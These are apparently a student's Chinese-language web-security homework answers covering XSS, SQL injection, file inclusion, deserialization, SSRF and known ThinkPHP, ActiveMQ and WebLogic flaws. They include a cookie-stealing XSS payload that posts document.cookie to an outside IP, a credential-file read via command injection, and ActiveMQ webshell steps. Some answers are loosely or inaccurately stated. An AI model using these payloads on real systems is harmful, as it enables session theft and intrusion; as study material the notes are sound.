# 作业1



#### 1、url编码中%23、%25、%26、%20、%00分别代表什么?

%3d   =
%23   #
%25   %
%26   &
%2f   /
%20   空格
%0a   新行
%00   空字节

 

#### 2、简述cookie和session中间有什么区别？

(1)cookie数据存放在客户的浏览器上，session数据放在服务器上

(2)cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗,如果主要考虑到安全应当使用session

(3)session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，如果主要考虑到减轻服务器性能方面，应当使用COOKIE

(4)单个cookie在客户端的限制是3K，就是说一个站点在客户端存放的COOKIE不能3K。

 

#### 3、Burpsuite中proxy、intruder、repeater三个组件各有何作用？

1、 Proxy——是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。

2、 Intruder——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。

3、 Repeater——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。

#### 4、简述sql注入中联合查询和盲注有什么区别、盲注分为哪几种类型?

union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同

盲注其实是sql注入的一种，之所以称为盲注是因为他不会根据你sql注入的攻击语句返回你想要知道的错误信息。

盲注分为布尔注入、延迟注入、报错注入

#  作业二

#### 1、阐述xss有几种类型，各有什么区别?

1.反射型XSS攻击

反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。反射型XSS通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。

2.存储型XSS攻击

也叫持久型XSS，主要将XSS代码提交存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。当目标用户访问该页面获取数据时，XSS代码会从服务器解析之后加载出来，返回到浏览器做正常的HTML和JS解析执行，XSS攻击就发生了。存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。

3.DOM-based 型XSS攻击

基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞。

 

#### 2、阐述xss在实现弹框后要深入利用应该如何利用？

1、Cookie盗取

```
一段XSS代码，可以放到输入框中随着数据一起上传，最后用户浏览的cookie信息都自动上传到http://172.16.11.2:8888 上了

<img src=x onerror = document.body.appendChild(document.createElement('img')).setAttribute('src','http://172.16.11.2:8888/?='+document.cookie); >
```

2、钓鱼（伪造登录框，页面）

3、获取IP段

4、站点重定向

```


<script type="text/javascript">window.location.href="跳转的目的地址";</script>

<script type="text/javascript">window. location.replace("跳转的目的地址");</script>

<script type="text/javascript">window. location.assign("跳转的目的地址");</script>
```

5、获取客户端页面信息，例如邮件内容窃取

6、XSS蠕虫

 

#### 3、文件上传中各种脚本语言对应的脚本文件分别有什么？

```
JavaScript		*.js
VBScript		   *.vb
PHP			   *.php
Python		   *.py
```



#### 4、文件上传和文件包含应该如何联动？

先用文件上传，上传图片马。因为是png结尾所以直接访问图片不会被解析。

然后利用文件包含解析png中的php代码

#### 5、你认为文件上传漏洞中最重要的几点是什么？

后缀名的限制与绕过

HTTP Header中的Content-Type的限制与绕过

文件头内容的限制与绕过

#### 6、文件包含中两种类型的区别是什么？

文件包含漏洞分为本地文件包含(Loacl File Inclusion,LFI)和远程文件包含(Remote File Inclusion,RFI)。这种漏洞貌不惊人，却危害很大。通过文件包含漏洞，可以读取系统中的敏感文件，源代码文件等，如密码文件，通过对密码文件进行暴力破解。若破解成功则可获取操作系统的用户账户，甚至可通过开放的远程连接服务进行连接控制。另外不管是本地文件包含还是远程文件包含，文件包含漏洞还可能导致执行任意代码。

> 本地文件包含
>
> 本地文件包含就是通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤允许遍历目录的字符注入浏览器并执行。



> 远程文件包含
>
> 远程文件包含就是允许攻击者包含一个远程的文件,一般是在远程服务器上预先设置好的脚本。 此漏洞是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击 甚至在目标服务器上执行代码。

# 作业三

#### 1、代码注入和命令注入的差别是什么，不回显的情况应如何利用?

> ##### 命令注入
>
> 当应用程序需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数，如php中的system, exec, shell_exec, passthru()等，当用户可以控制名利执行函数中的参数是，将可注入系统名利到正常名利中，造成命令注入攻击，如system(args), args= ‘cat /etc/passwd’;
>

> ##### 代码注入
>
> 应用程序在运行一些能够将字符串转为代码的函数（如php中的eval, create_function(), call_user_func()，call_user_func_array()）时， 没有考虑用户是否可以控制这个字符串，将造成代码执行漏洞，如（eval(“args”))； args=‘system(‘cat /etc/passwd’)’, 获取http://ip/?func=phpinfo();
>

 

#### 2、阐述几种php魔术方法，分别在什么时候调用？

```
__construct  当一个对象创建时被调用，

__destruct  当一个对象销毁时被调用，

__toString  当一个对象被当作一个字符串被调用。

__wakeup()  使用unserialize时触发

__sleep()  使用serialize时触发

__destruct()  对象被销毁时触发

__call()  在对象上下文中调用不可访问的方法时触发

__callStatic()  在静态上下文中调用不可访问的方法时触发

__get()  用于从不可访问的属性读取数据

__set()  用于将数据写入不可访问的属性

__isset()  在不可访问的属性上调用isset()或empty()触发

__unset()  在不可访问的属性上使用unset()时触发

__toString()  把类当作字符串使用时触发,返回值需要为字符串
```

#### 3、在php反序列化中的关键点是什么？

在本质上，反序列化的数据是没有危害的，但是当反序列化数据是用户可控时，这时就会产生一些预期外的结果，也就可能存在危害，所以在利用反序列化漏洞的时候，关键是数据可控。

#### 4、在php反序列化中私有成员和公有成员在构造恶意反序列化数据时有何区别？

私有成员在构造恶意反序列化数据时，要对该私有成员的name进行限制要在成员name前加上“%00对象名%00”。 

公有成员在构造恶意反序列化数据时就不需要限制了 

#### 5、Ssrf漏洞能够造成什么危害？

1、可以对外网服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息 。

2、攻击运行在内网或者本地的应用程序。

3、对内网web应用进行指纹识别，通过访问默认文件实现 。

4、攻击内外网的web应用。sql注入、struct2、redis等。

5、利用file协议读取本地文件等。

#### 6、Xxe漏洞能够造成什么危害？

1.DOS攻击

2.SSRF攻击

3.使用file协议读取任意文件

4.端口探测

5.执行系统命令

# 作业四

#### 1、整理thinkphp存在哪些历史漏洞，分别如何利用?

1、ThinkPHP2.x/3.0远程代码执行漏洞

影响范围：ThinkPHP 2.x,3.0

2、ThinkPHP 3.2.4 SQL注入漏洞

影响范围：ThinkPHP <= 3.2.4

3、thinkphp 3.1.3 s parameter注入漏洞

影响范围：ThinkPHP <= 3.1.3

4、ThinkPHP 3.x update方法SQL注入漏洞

影响范围：ThinkPHP <3.2.4

5、ThinkPHP 3.x orderby方法SQL注入漏洞

 影响范围：ThinkPHP <3.2.4

6、ThinkPHP cacheFile变量文件包含漏洞

影响范围：ThinkPHP 5.0.0-5.0.18

7、ThinkPHP cache缓存函数远程代码执行潺洞

影响范围：ThinkPHP 5.0.0-5.0.10

8、ThinkPHP5远程代码执行漏洞

影响范围：ThinkPHP 5.0.7-5.0.22，ThinkPHP 5.1.0-5.1.30

9、ThinkPHP 6任意文件操作漏洞

影响范围：ThinkPHP 6.0.0-6.0.1

10、ThinkPHP6反序列化漏洞

影响范围：ThinkPHP 6.0.0-6.0.1   

#### 2、Activemq任意文件写入漏洞具体如何利用？

写入webshell需要写在admin或api应用中，而这俩应用都需要登录才能访问。默认的ActiveMQ账号密码都为admin，访问/admin/test/systemProperties.jsp查看ActiveMQ的绝对路径

bp抓包

构造PUT请求,当返回204状态码则说明文件上传成功

MOVE请求，将该文件移动到/api/中，且以.jsp命名

#### 3、Shiro的一般特征是什么？

- 易于使用 - 易用性是这个项目的最终目标。提供易于理解的 Java Security API。
- 广泛性 - 没有其他安全框架可以达到Apache Shiro宣称的广度，它可以为你的安全需求提供“一站式”服务。
- 灵活性 - Apache Shiro可以工作在任何应用环境中。虽然它工作在Web、EJB和IoC环境中，但它并不依赖这些环境。Shiro既不强加任何规范，也无需过多依赖。
- Web能力 - Apache Shiro对Web应用的支持很神奇，允许你基于应用URL和Web协议（如REST）创建灵活的安全策略，同时还提供了一套控制页面输出的JSP标签库。
- 可插拔 - Shiro干净的API和设计模式使它可以方便地与许多的其他框架和应用进行集成。你将看到Shiro可以与诸如Spring、Grails、Wicket、Tapestry、Mule、Apache Camel、Vaadin这类第三方框架无缝集成。
- 支持 -Apache Shiro是Apache软件基金会成员，这是一个公认为了社区利益最大化而行动的组织。项目开发和用户组都有随时愿意提供帮助的友善成员。像Katasoft这类商业公司，还可以给你提供需要的专业支持和服务。

#### 4、Weblogic有哪些常见的安全漏洞？

- 未授权命令执行漏洞(CVE-2020-14882&14883)
- 弱口令&& 后台getshell
- SSRF漏洞 （CVE-2014-4210）
- 任意文件上传漏洞（CVE-2018-2894）
- 反序列化漏洞（CVE-2017-10271 & CVE-2017-3506）

 

#### 5、解析漏洞有哪些，都涉及到哪几个中间件，详细整理并形成学习记录。

1)	解析漏洞-IIS5.x-7.x解析漏洞

   该解析漏洞也只能解析asp文件，不能解析aspx文件。

2)	Apche换行解析漏洞

   Apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar、gif等扩展名是Apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的。

3)	解析漏洞-Nginx解析漏洞

漏洞产生原因：错误地解析了请求的URL,错误地获取到用户请求的文件名,导致出现权限绕过、代码执行的连带影响。

漏洞原理：Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析

 